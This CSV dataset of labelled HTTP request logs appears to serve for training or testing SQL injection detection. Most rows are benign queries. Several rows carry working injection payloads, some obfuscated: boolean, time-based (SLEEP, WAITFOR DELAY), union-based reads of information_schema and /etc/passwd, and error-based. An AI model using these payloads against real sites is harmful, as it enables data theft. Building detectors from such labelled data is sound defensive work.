timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-01-29T02:24:00Z,10.90.XXX.XXX,GET,/item,"{""id"": ""helmet price""}",,,GET /item?id=helmet price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9b5151d6ad425324c98d720445c8526f
2025-10-06T01:03:59Z,10.74.XXX.XXX,GET,/item,"{""id"": ""helmet price""}",,,GET /item?id=helmet price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9b5151d6ad425324c98d720445c8526f
2025-02-02T08:31:09Z,10.32.XXX.XXX,GET,/item,"{""id"": ""admin'/**/#""}",,,GET /item?id=admin'/**/# HTTP/1.1,1.0,boolean,query_param,none,p0157,0.2,dataset.csv,,,,62cd84067b85c49b166a55522dc85e5a
2025-10-28T12:18:10Z,10.74.XXX.XXX,GET,/item,"{""id"": ""admin'/**/#""}",,,GET /item?id=admin'/**/# HTTP/1.1,1.0,boolean,query_param,none,p0029,0.2,dataset.csv,,,,62cd84067b85c49b166a55522dc85e5a
2025-03-12T15:40:50Z,10.210.XXX.XXX,GET,/search,"{""q"": ""bike price""}",,,GET /search?q=bike price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2b0316856d9d76dddc99ae3647b97991
2025-04-28T05:38:55Z,10.85.XXX.XXX,GET,/search,"{""q"": ""bike price""}",,,GET /search?q=bike price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2b0316856d9d76dddc99ae3647b97991
2025-10-24T23:04:15Z,10.26.XXX.XXX,GET,/search,"{""q"": ""bike price""}",,,GET /search?q=bike price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2b0316856d9d76dddc99ae3647b97991
2025-04-28T09:18:49Z,10.13.XXX.XXX,GET,/product,"{""id"": ""chair"", ""ref"": ""74""}",,,GET /product?id=chair&ref=74 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ecc56979b35047d36aee5f2825bdfac1
2025-08-21T05:05:48Z,10.133.XXX.XXX,GET,/item,"{""id"": ""('\nAND\n(SELECT\n*\nFROM\n(SELECT(SLEEP(5)))a)#)""}",,,"GET /item?id=('
AND
(SELECT
*
FROM
(SELECT(SLEEP(5)))a)#) HTTP/1.1",1.0,time-based,query_param,base64,p0166,1.0,dataset.csv,,,,027487db314dd778c26f394d79bf6983
2025-03-07T15:54:09Z,10.131.XXX.XXX,GET,/item/9000/details,,,,GET /item/9000/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,afdf671ba655253b48e51e00a4df73ef
2025-08-19T12:56:26Z,10.202.XXX.XXX,GET,/product,"{""id"": ""' AND (SeLeCt * FROM (SeLeCt(SLEEP(5)))a)#%00"", ""ref"": ""book price""}",,,GET /product?id=' AND (SeLeCt * FROM (SeLeCt(SLEEP(5)))a)#%00&ref=book price HTTP/1.1,1.0,time-based,query_param,none,p0080,0.2,dataset.csv,,,,5df94b698d2eb43a26536721bf422897
2025-07-16T20:04:10Z,10.98.XXX.XXX,GET,/item,"{""id"": ""battery review""}",,,GET /item?id=battery review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,99a1a40897fce2f20f2c2f90fca3bda0
2025-08-08T12:29:56Z,10.20.XXX.XXX,GET,/item,"{""id"": ""battery review""}",,,GET /item?id=battery review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,99a1a40897fce2f20f2c2f90fca3bda0
2025-06-12T08:04:17Z,10.215.XXX.XXX,GET,/item,"{""id"": ""battery review""}",,,GET /item?id=battery review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,99a1a40897fce2f20f2c2f90fca3bda0
2025-03-26T13:08:46Z,10.140.XXX.XXX,POST,/api/search,,"{{""user"":""54"",""query"":""phone price""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""54"",""query"":""phone price""}}",0.0,,,,,0.0,dataset.csv,,,,28035547d30c7efb64077b884678430f
2025-09-16T18:26:30Z,10.204.XXX.XXX,GET,/product,"{""id"": ""MOVIE"", ""ref"": ""machine learning""}",,,GET /product?id=MOVIE&ref=machine learning HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c94940fddf7f150dc661de7dabf76f60
2025-10-18T16:23:02Z,10.72.XXX.XXX,GET,/item/3282/details,,,,GET /item/3282/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,cf85824f868d33862e3916bf15697e61
2025-03-26T15:14:57Z,10.41.XXX.XXX,GET,/product,"{""id"": ""bike price"", ""ref"": ""bed price""}",,,GET /product?id=bike price&ref=bed price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4d6ae1cdf7a9b4fc34e82db77b3874e7
2025-10-10T18:50:53Z,10.236.XXX.XXX,GET,/item,"{""id"": ""scooter review""}",,,GET /item?id=scooter review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,636f18304a6be5936abc1f0fbe59d305
2025-03-11T04:44:58Z,10.228.XXX.XXX,GET,/item,"{""id"": ""scooter review""}",,,GET /item?id=scooter review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,636f18304a6be5936abc1f0fbe59d305
2025-05-12T05:33:57Z,10.191.XXX.XXX,GET,/item,"{""id"": ""scooter review""}",,,GET /item?id=scooter review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,636f18304a6be5936abc1f0fbe59d305
2025-10-14T07:40:40Z,10.96.XXX.XXX,POST,/comment,,username=best camera&comment=scooter,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best camera&comment=scooter",0.0,,,,,0.0,dataset.csv,,,,bd2a1207d74d9f6b51c5a48f05d931e3
2025-03-23T01:13:38Z,10.11.XXX.XXX,POST,/api/search,,"{{""user"":""movie price"",""query"":""Pants""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""movie price"",""query"":""Pants""}}",0.0,,,,,0.0,dataset.csv,,,,d64f7cc583c9cb90b3287f21f2142fc8
2025-01-05T14:43:39Z,10.72.XXX.XXX,GET,/item,"{""id"": ""game 2025""}",,,GET /item?id=game 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,666209a19226a097831cd3e15a116f25
2025-05-10T13:20:57Z,10.150.XXX.XXX,GET,/item,"{""id"": ""game 2025""}",,,GET /item?id=game 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,666209a19226a097831cd3e15a116f25
2025-10-07T15:47:16Z,10.89.XXX.XXX,GET,/item,"{""id"": ""game 2025""}",,,GET /item?id=game 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,666209a19226a097831cd3e15a116f25
2025-05-13T16:32:34Z,10.103.XXX.XXX,POST,/api/search,,"{{""user"":""python tutorial"",""query"":""Mysql database""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""python tutorial"",""query"":""Mysql database""}}",0.0,,,,,0.0,dataset.csv,,,,ca1274108876adccb3aa5443b90578be
2025-05-18T04:54:00Z,10.81.XXX.XXX,GET,/product,"{""id"": ""1 ' OR BENCHMARK(5000000,MD5('A'))# AND 1=1"", ""ref"": ""MUSIC""}",,,"GET /product?id=1 ' OR BENCHMARK(5000000,MD5('A'))# AND 1=1&ref=MUSIC HTTP/1.1",1.0,time-based,query_param,none,p0139,0.2,dataset.csv,,,,aac7116d73e64c7aba5756d1d9dfe23c
2025-05-23T15:05:51Z,10.216.XXX.XXX,GET,/product,"{""id"": ""51"", ""ref"": ""frank""}",,,GET /product?id=51&ref=frank HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ff491f743c432f4b9a293888a83fc5da
2025-03-22T13:43:58Z,10.211.XXX.XXX,GET,/product,"{""id"": ""86"", ""ref"": ""MScgQU5EIFNMRUVQKDUpIw==""}",,,GET /product?id=86&ref=MScgQU5EIFNMRUVQKDUpIw== HTTP/1.1,1.0,time-based,query_param,comment_insert,p0072,0.6,dataset.csv,,,,424402296fc2d6de395182543c0cfe87
2025-02-09T09:26:05Z,10.217.XXX.XXX,POST,/api/search,,"{{""user"":""48"",""query"":""best fitness tips""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""48"",""query"":""best fitness tips""}}",0.0,,,,,0.0,dataset.csv,,,,1c9d12d225dc4586603333b8bd5de28a
2025-09-16T02:46:15Z,10.205.XXX.XXX,GET,/product,"{""id"": ""JzsgV0FJVEZPUiBERUxBWSAnMDowOjUnLS0="", ""ref"": ""best hotel booking""}",,,GET /product?id=JzsgV0FJVEZPUiBERUxBWSAnMDowOjUnLS0=&ref=best hotel booking HTTP/1.1,1.0,time-based,query_param,url_encode,p0194,0.4,dataset.csv,,,,f20b00f456d5e716e96adf2c25dbd173
2025-05-03T13:11:59Z,10.109.XXX.XXX,POST,/comment,,username=shoes 2025&comment=Book,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=shoes 2025&comment=Book",0.0,,,,,0.0,dataset.csv,,,,fa6b57bac8da66d82304b6a8380ebaeb
2025-06-28T16:33:42Z,10.40.XXX.XXX,GET,/search,"{""q"": ""%2527%253B%2520WAITFOr%2520DELAY%2520%25270%253A0%253A5%2527--""}",,,GET /search?q=%2527%253B%2520WAITFOr%2520DELAY%2520%25270%253A0%253A5%2527-- HTTP/1.1,1.0,time-based,query_param,url_encode,p0073,0.4,dataset.csv,,,,5beb5c2a00b18cbda7f2389ca5128131
2025-02-19T02:35:56Z,10.135.XXX.XXX,GET,/search,"{""q"": ""%2527%253B%2520WAITFOr%2520DELAY%2520%25270%253A0%253A5%2527--""}",,,GET /search?q=%2527%253B%2520WAITFOr%2520DELAY%2520%25270%253A0%253A5%2527-- HTTP/1.1,1.0,time-based,query_param,case_obf,p0073,0.5,dataset.csv,,,,5beb5c2a00b18cbda7f2389ca5128131
2025-03-13T08:56:20Z,10.21.XXX.XXX,GET,/product,"{""id"": ""movie 2025"", ""ref"": ""13""}",,,GET /product?id=movie 2025&ref=13 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f36b8f64481a00b1d02a0095c3158e4f
2025-10-18T09:29:50Z,10.194.XXX.XXX,GET,/product,"{""id"": ""73"", ""ref"": ""SHELF""}",,,GET /product?id=73&ref=SHELF HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1cafb5e355f73404225252baa4696ed3
2025-08-26T00:55:00Z,10.51.XXX.XXX,GET,/product,"{""id"": ""1 '))/**/Or/**/(('1'='1"", ""ref"": ""jacket review""}",,,GET /product?id=1 '))/**/Or/**/(('1'='1&ref=jacket review HTTP/1.1,1.0,boolean,query_param,case_obf,p0023,0.5,dataset.csv,,,,c3243f94165ca072884ed2da49effd6e
2025-05-07T15:45:58Z,10.24.XXX.XXX,GET,/product,"{""id"": ""python tutorial review"", ""ref"": ""sofa review""}",,,GET /product?id=python tutorial review&ref=sofa review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2c5eec2ab840cf5d490ab53d95cf57d0
2025-07-20T09:11:26Z,10.41.XXX.XXX,POST,/comment,,username=MUSIC&comment=shirt,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=MUSIC&comment=shirt",0.0,,,,,0.0,dataset.csv,,,,7f14b572e04e47948b846f3e330ee2ea
2025-04-01T10:29:34Z,10.207.XXX.XXX,GET,/product,"{""id"": ""helmet 2025"", ""ref"": ""hotel booking price""}",,,GET /product?id=helmet 2025&ref=hotel booking price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,6c348fa44ede839493ea3318bdd20b1d
2025-02-13T12:08:00Z,10.239.XXX.XXX,POST,/comment,,username=%27+OR+polygon%28%28select+%2A+from%28select+%2A+from%28select+version%28%29%29a%29b%29%29--&comment=workout plans review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27+OR+polygon%28%28select+%2A+from%28select+%2A+from%28select+version%28%29%29a%29b%29%29--&comment=workout plans review",1.0,error,body_form,none,p0124,0.3,dataset.csv,,,,ae85d3a1f56323420cec6126e77e558a
2025-05-09T11:23:46Z,10.168.XXX.XXX,GET,/product,"{""id"": ""workout plans 2025"", ""ref"": ""'\nOr\n'a'='a""}",,,"GET /product?id=workout plans 2025&ref='
Or
'a'='a HTTP/1.1",1.0,boolean,query_param,url_encode,p0188,0.4,dataset.csv,,,,82d9d500a8440e360f493ef418733c1e
2025-07-19T07:40:02Z,10.21.XXX.XXX,POST,/comment,,username=travel destinations price&comment=camera,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=travel destinations price&comment=camera",0.0,,,,,0.0,dataset.csv,,,,afcb3d08e027e10cf94ea156c0bff5a0
2025-07-02T22:33:38Z,10.42.XXX.XXX,POST,/api/search,,"{{""user"":""45"",""query"":""admin""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""45"",""query"":""admin""}}",0.0,,,,,0.0,dataset.csv,,,,cbbad9590e1bbd3b9cadb0402b63b5df
2025-08-29T12:53:33Z,192.168.XXX.XXX,GET,/product,"{""id"": ""1 '\tUNION\tSeLeCt\t1,2,group_concat(table_name)\tFROM\tinformation_schema.tables--%00"", ""ref"": ""chair review""}",,,"GET /product?id=1 '	UNION	SeLeCt	1,2,group_concat(table_name)	FROM	information_schema.tables--%00&ref=chair review HTTP/1.1",1.0,union,query_param,whitespace_obf,p0049,0.5,dataset.csv,,,,db94fee6e77f937edda3576a58f50585
2025-03-15T09:26:58Z,10.105.XXX.XXX,GET,/product,"{""id"": ""lamp"", ""ref"": ""'/**/AND/**/(SeLeCt/**/COUNT(*)/**/FROM/**/users)>0--%00""}",,,GET /product?id=lamp&ref='/**/AND/**/(SeLeCt/**/COUNT(*)/**/FROM/**/users)>0--%00 HTTP/1.1,1.0,blind,query_param,hex,p0102,1.0,dataset.csv,,,,41f2bd01e5a9199aa52249b97702c62a
2025-04-02T02:11:54Z,10.185.XXX.XXX,GET,/search,"{""q"": ""best table""}",,,GET /search?q=best table HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,134dec48eeae11fb6f8dd72d7717bd9c
2025-06-14T11:44:40Z,10.99.XXX.XXX,GET,/search,"{""q"": ""best table""}",,,GET /search?q=best table HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,134dec48eeae11fb6f8dd72d7717bd9c
2025-01-12T17:55:15Z,10.156.XXX.XXX,GET,/search,"{""q"": ""best table""}",,,GET /search?q=best table HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,134dec48eeae11fb6f8dd72d7717bd9c
2025-04-08T08:00:32Z,192.168.XXX.XXX,GET,/product,"{""id"": ""' UNION SELECT * FROM (SELECT NULL,NULL,NULL)a#%00"", ""ref"": ""fitness tips price""}",,,"GET /product?id=' UNION SELECT * FROM (SELECT NULL,NULL,NULL)a#%00&ref=fitness tips price HTTP/1.1",1.0,union,query_param,none,p0051,0.2,dataset.csv,,,,182bc87978e9d7086b9a8668b62f4a4f
2025-04-08T01:55:54Z,10.54.XXX.XXX,GET,/item,"{""id"": ""movie 2025""}",,,GET /item?id=movie 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,dafb66e4b31170cec658ec6a597e3c0b
2025-02-03T11:41:12Z,10.34.XXX.XXX,GET,/item,"{""id"": ""movie 2025""}",,,GET /item?id=movie 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,dafb66e4b31170cec658ec6a597e3c0b
2025-09-03T07:58:50Z,10.32.XXX.XXX,GET,/item,"{""id"": ""movie 2025""}",,,GET /item?id=movie 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,dafb66e4b31170cec658ec6a597e3c0b
2025-04-14T11:30:23Z,10.56.XXX.XXX,GET,/product,"{""id"": ""Workout plans"", ""ref"": ""CHAIR""}",,,GET /product?id=Workout plans&ref=CHAIR HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,462b69ddcd1e2f2d1635dc29a052b492
2025-09-07T12:59:25Z,10.191.XXX.XXX,GET,/search,"{""q"": ""'/**/OR/**/a=a--""}",,,GET /search?q='/**/OR/**/a=a-- HTTP/1.1,1.0,boolean,query_param,comment_insert,p0144,0.6,dataset.csv,,,,cc1034760425197b01ddc6d3a787d28e
2025-10-22T08:21:11Z,10.166.XXX.XXX,POST,/comment,,username=battery price&comment=%252527%252520AND%252520extractvalue%2525281%25252Cconcat%2525280x7e%25252Cversion%252528%252529%252529%252529--,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=battery price&comment=%252527%252520AND%252520extractvalue%2525281%25252Cconcat%2525280x7e%25252Cversion%252528%252529%252529%252529--",1.0,error,body_form,hex,p0057,1.0,dataset.csv,,,,acc1d051c511160318e963c748e97c02
2025-05-11T10:16:09Z,10.89.XXX.XXX,GET,/search,"{""q"": ""MScgQU5EIENIQVIoNjUpPSdB""}",,,GET /search?q=MScgQU5EIENIQVIoNjUpPSdB HTTP/1.1,1.0,blind,query_param,case_obf,p0105,0.5,dataset.csv,,,,91fc96be1b84486d444a7c30ec5889d3
2025-04-17T18:14:07Z,10.167.XXX.XXX,POST,/comment,,username=1%27%2BAND%2BSELECT%2BCASE%2BWHEN%2B%281%3D1%29%2BTHEN%2B1%2BELSE%2B0%2BEND&comment=desk 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=1%27%2BAND%2BSELECT%2BCASE%2BWHEN%2B%281%3D1%29%2BTHEN%2B1%2BELSE%2B0%2BEND&comment=desk 2025",1.0,blind,body_form,url_encode,p0106,0.5,dataset.csv,,,,6b6b86c7a8c2e3e9507f327a43b6ac1a
2025-05-28T17:37:51Z,10.115.XXX.XXX,GET,/product,"{""id"": ""49"", ""ref"": ""9""}",,,GET /product?id=49&ref=9 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d6b5fec4d690b962d1160218a13ca2c5
2025-02-23T23:54:53Z,10.197.XXX.XXX,GET,/item,"{""id"": ""97""}",,,GET /item?id=97 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f5eac87c752330821ae787a19cf6c56a
2025-07-22T11:23:18Z,10.239.XXX.XXX,GET,/item,"{""id"": ""97""}",,,GET /item?id=97 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f5eac87c752330821ae787a19cf6c56a
2025-02-02T18:59:10Z,10.122.XXX.XXX,GET,/item,"{""id"": ""97""}",,,GET /item?id=97 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f5eac87c752330821ae787a19cf6c56a
2025-04-11T19:23:30Z,10.110.XXX.XXX,GET,/product,"{""id"": ""Camera"", ""ref"": ""python tutorial review""}",,,GET /product?id=Camera&ref=python tutorial review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4882e932dbffa0454c1d76a561b81cc7
2025-07-16T04:55:12Z,10.128.XXX.XXX,GET,/product,"{""id"": ""laptop review"", ""ref"": ""best watch""}",,,GET /product?id=laptop review&ref=best watch HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8a78bbe7be8f3d8efefac0e93c173a6c
2025-06-03T09:47:30Z,10.133.XXX.XXX,GET,/item,"{""id"": ""Camera""}",,,GET /item?id=Camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3f49d2ef875a595973f932a0384d2e34
2025-04-17T12:27:14Z,10.36.XXX.XXX,GET,/item,"{""id"": ""Camera""}",,,GET /item?id=Camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3f49d2ef875a595973f932a0384d2e34
2025-10-11T14:59:17Z,10.231.XXX.XXX,GET,/item,"{""id"": ""Camera""}",,,GET /item?id=Camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3f49d2ef875a595973f932a0384d2e34
2025-04-01T19:49:16Z,10.4.XXX.XXX,GET,/product,"{""id"": ""50"", ""ref"": ""63""}",,,GET /product?id=50&ref=63 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,cb30d0da44c006a4b8099170b43db4d7
2025-02-02T04:45:52Z,192.168.XXX.XXX,GET,/item,"{""id"": ""%27%20UNION%20SeLeCt%20NULL%2CNULL%2Cload_file%28%27/etc/passwd%27%29--""}",,,GET /item?id=%27%20UNION%20SeLeCt%20NULL%2CNULL%2Cload_file%28%27/etc/passwd%27%29-- HTTP/1.1,1.0,union,query_param,whitespace_obf,p0050,0.5,dataset.csv,,,,6de834d7ad3856e989bf6a18c217c104
2025-07-13T04:50:40Z,10.237.XXX.XXX,POST,/comment,,username=100&comment=laptop,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=100&comment=laptop",0.0,,,,,0.0,dataset.csv,,,,c0dc0e7165a292cbb38701bc29c08838
2025-08-31T18:56:30Z,10.114.XXX.XXX,POST,/comment,,username=Healthy recipes&comment=shirt,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Healthy recipes&comment=shirt",0.0,,,,,0.0,dataset.csv,,,,529d5861688f660faf8521904f86cc26
2025-04-19T18:31:08Z,10.232.XXX.XXX,POST,/comment,,username=82&comment=Fast delivery,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=82&comment=Fast delivery",0.0,,,,,0.0,dataset.csv,,,,b23402ac509d9b4e76baff6e682bb765
2025-03-27T13:35:43Z,10.84.XXX.XXX,POST,/api/search,,"{{""user"":""59"",""query"":""%27%20OR%20SLEEP%285%29#""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""59"",""query"":""%27%20OR%20SLEEP%285%29#""}}",1.0,time-based,body_json,hex,p0069,1.0,dataset.csv,,,,853c05dd0696e982a63cb7039cd055d5
2025-09-10T14:37:54Z,10.39.XXX.XXX,POST,/api/search,,"{{""user"":""CHAIR"",""query"":""desk""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""CHAIR"",""query"":""desk""}}",0.0,,,,,0.0,dataset.csv,,,,6174a8e859503bcaca91b698ec487fd5
2025-05-12T17:01:39Z,10.251.XXX.XXX,POST,/comment,,username=sofa&comment=JyBBTkQgZXhwKH4oU0VMRUNUICogRlJPTSAoU0VMRUNUIDEpYSkpLS0%3D%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=sofa&comment=JyBBTkQgZXhwKH4oU0VMRUNUICogRlJPTSAoU0VMRUNUIDEpYSkpLS0%3D%2500",1.0,error,body_form,hex,p0059,1.0,dataset.csv,,,,cf18f022646e938df7490cbaf01ee078
2025-09-07T16:51:30Z,10.165.XXX.XXX,GET,/search,"{""q"": "") Or ('1'='1""}",,,GET /search?q=) Or ('1'='1 HTTP/1.1,1.0,boolean,query_param,none,p0021,0.2,dataset.csv,,,,bf91654a41fd95123d422b69c78b9ee3
2025-05-21T02:05:37Z,10.101.XXX.XXX,GET,/product,"{""id"": ""sofa 2025"", ""ref"": ""best fitness tips""}",,,GET /product?id=sofa 2025&ref=best fitness tips HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8d33c5037ebd2590e6e0ec0d7dd58a58
2025-03-18T04:53:13Z,10.64.XXX.XXX,GET,/search,"{""q"": ""8""}",,,GET /search?q=8 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,095f3989f21432e1af2cacf6ef9fbbd5
2025-03-22T13:20:51Z,10.109.XXX.XXX,GET,/search,"{""q"": ""8""}",,,GET /search?q=8 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,095f3989f21432e1af2cacf6ef9fbbd5
2025-06-07T05:58:12Z,10.15.XXX.XXX,GET,/search,"{""q"": ""8""}",,,GET /search?q=8 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,095f3989f21432e1af2cacf6ef9fbbd5
2025-06-08T20:37:05Z,10.89.XXX.XXX,GET,/item,"{""id"": ""tire price""}",,,GET /item?id=tire price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4a04d7d1a3f26eca55eb303815cb399c
2025-03-05T07:32:25Z,10.30.XXX.XXX,GET,/item,"{""id"": ""tire price""}",,,GET /item?id=tire price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4a04d7d1a3f26eca55eb303815cb399c
2025-05-12T16:08:48Z,10.229.XXX.XXX,GET,/item,"{""id"": ""tire price""}",,,GET /item?id=tire price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4a04d7d1a3f26eca55eb303815cb399c
2025-08-13T15:33:33Z,10.255.XXX.XXX,GET,/product,"{""id"": ""11"", ""ref"": ""Mysql database""}",,,GET /product?id=11&ref=Mysql database HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,939bfde4974c71a0a31e82fa69d8bcff
2025-10-04T13:28:42Z,10.252.XXX.XXX,POST,/comment,,username=camera 2025&comment=17,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=camera 2025&comment=17",0.0,,,,,0.0,dataset.csv,,,,8491aa96c2a569650bf42f1f4ddece85
2025-04-18T14:51:29Z,10.94.XXX.XXX,POST,/comment,,username=camera 2025&comment=17,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=camera 2025&comment=17",0.0,,,,,0.0,dataset.csv,,,,8491aa96c2a569650bf42f1f4ddece85
2025-05-12T12:13:45Z,10.116.XXX.XXX,POST,/comment,,username=60&comment=Scooter,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=60&comment=Scooter",0.0,,,,,0.0,dataset.csv,,,,476763f4e085853ea6719f1bc29e4fee
2025-08-17T03:15:41Z,10.45.XXX.XXX,GET,/item,"{""id"": ""Travel destinations""}",,,GET /item?id=Travel destinations HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9febad214c9a8885c67195c14a1ab421
2025-09-25T09:12:14Z,10.150.XXX.XXX,GET,/item,"{""id"": ""Travel destinations""}",,,GET /item?id=Travel destinations HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9febad214c9a8885c67195c14a1ab421
2025-01-15T18:16:03Z,10.156.XXX.XXX,GET,/item,"{""id"": ""Travel destinations""}",,,GET /item?id=Travel destinations HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9febad214c9a8885c67195c14a1ab421
2025-06-14T20:52:16Z,10.32.XXX.XXX,GET,/product,"{""id"": ""car review"", ""ref"": ""'/**/AND/**/gtid_subset(version(),1)--%00""}",,,"GET /product?id=car review&ref='/**/AND/**/gtid_subset(version(),1)--%00 HTTP/1.1",1.0,error,query_param,none,p0165,0.2,dataset.csv,,,,1e155e2505cd108caeb1963dacd118c8
2025-02-13T01:20:36Z,10.78.XXX.XXX,POST,/api/search,,"{{""user"":""1"",""query"":""laptop 2025""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""1"",""query"":""laptop 2025""}}",0.0,,,,,0.0,dataset.csv,,,,ab801ee3e9f6b482812f1dce138fe3ae
